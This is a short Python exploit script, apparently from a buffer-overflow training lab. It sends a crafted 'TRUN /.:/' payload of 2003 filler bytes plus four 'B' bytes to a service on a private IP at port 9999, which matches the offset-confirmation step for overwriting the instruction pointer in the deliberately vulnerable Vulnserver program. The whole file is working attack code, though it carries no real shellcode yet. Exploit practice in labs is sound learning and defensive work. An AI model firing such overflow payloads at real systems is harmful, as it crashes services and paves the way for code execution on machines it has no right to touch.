#!/usr/bin/python3

import sys
import socket

shellcode = "A" * 2003 + "B" * 4

ip = '192.168.253.136'
port = 9999

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))
	bytes_to_send = 'TRUN /.:/' + shellcode
	s.send((bytes_to_send.encode()))
	s.close()



except Exception as e:
	print(f"Error connecting to server")		
	sys.exit()
